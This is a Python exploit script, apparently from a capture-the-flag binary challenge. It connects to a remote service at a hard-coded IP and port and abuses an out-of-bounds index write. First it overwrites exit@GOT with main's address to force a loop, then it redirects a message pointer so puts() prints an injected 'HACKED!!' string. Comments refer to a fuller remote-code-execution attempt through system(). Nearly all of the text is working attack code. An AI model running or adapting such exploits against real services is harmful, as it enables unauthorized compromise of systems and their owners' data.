#!/usr/bin/env python3
"""
Final attempt: Check if remote is actually exploitable
Try to just get SOME kind of code execution proof
"""
import socket
import time

print("[*] Testing if ANY GOT overwrite works without crash...")
print("[*] Strategy: Overwrite exit@GOT with main address for infinite loop")

values_base = 0x6010c0
exit_got = 0x601050
main_addr = 0x4008b6  # main function address

offset_exit = (exit_got - values_base) // 4  # -28

s = socket.socket()
s.settimeout(15)
s.connect(('34.84.25.24', 58554))

print(f"[*] Overwriting exit@GOT (offset {offset_exit}) with main@{hex(main_addr)}...")

# Write main address to exit@GOT
s.recv(4096)
s.sendall(f"{offset_exit}\n".encode())
time.sleep(0.1)
s.recv(4096)
s.sendall(f"{main_addr & 0xFFFFFFFF}\n".encode())
time.sleep(0.1)

s.recv(4096)
s.sendall(f"{offset_exit + 1}\n".encode())
time.sleep(0.1)
s.recv(4096)
s.sendall(f"{main_addr >> 32}\n".encode())
time.sleep(0.1)

# Now trigger scanf error -> handle_error() -> exit(1) -> main()
s.recv(4096)
s.sendall(b"AAAA\n")  # Non-integer triggers error
time.sleep(1)

output = s.recv(8192)
print("\n" + "="*60)
print("Response after triggering:")
print("="*60)
print(output.decode(errors='ignore'))

if b'index? >' in output:
    print("\n[+] SUCCESS! exit@GOT was overwritten - program looped!")
    print("[*] This proves GOT is writable. The RCE exploit should work...")
    print("[*] But something else is causing the crash - maybe:")
    print("    - system() function behavior on remote")
    print("    - Shell initialization fails")
    print("    - Timeout kills process too fast")
else:
    print("\n[-] No loop detected - GOT write failed or crashed")

s.close()

# One more test: Can we overwrite msg and actually have puts() print it?
print("\n" + "="*60)
print("[*] Test: Can puts() actually print our modified msg?")
print("="*60)

s = socket.socket()
s.settimeout(15)
s.connect(('34.84.25.24', 58554))

# Write recognizable string
test_str = b"HACKED!!\x00\x00\x00\x00"  # Pad to multiple of 4
import struct
str_ints = [struct.unpack('<I', test_str[i:i+4])[0] for i in range(0, len(test_str), 4)]

for i, val in enumerate(str_ints):
    s.recv(4096)
    s.sendall(f"{i}\n".encode())
    time.sleep(0.05)
    s.recv(4096)
    s.sendall(f"{val}\n".encode())
    time.sleep(0.05)

# Point msg to values[0]
offset_msg = -22
s.recv(4096)
s.sendall(f"{offset_msg}\n".encode())
time.sleep(0.05)
s.recv(4096)
s.sendall(f"{values_base}\n".encode())
time.sleep(0.05)

s.recv(4096)
s.sendall(f"{offset_msg + 1}\n".encode())
time.sleep(0.05)
s.recv(4096)
s.sendall(b"0\n")
time.sleep(0.05)

# Exit
s.recv(4096)
s.sendall(b"-1\n")
time.sleep(1)

output = s.recv(8192)
print(output.decode(errors='ignore'))

if b'HACKED!!' in output:
    print("\n[+] SUCCESS! puts() printed our string - msg overwrite works!")
else:
    print("\n[-] String not found - either crashed or msg overwrite failed")

s.close()
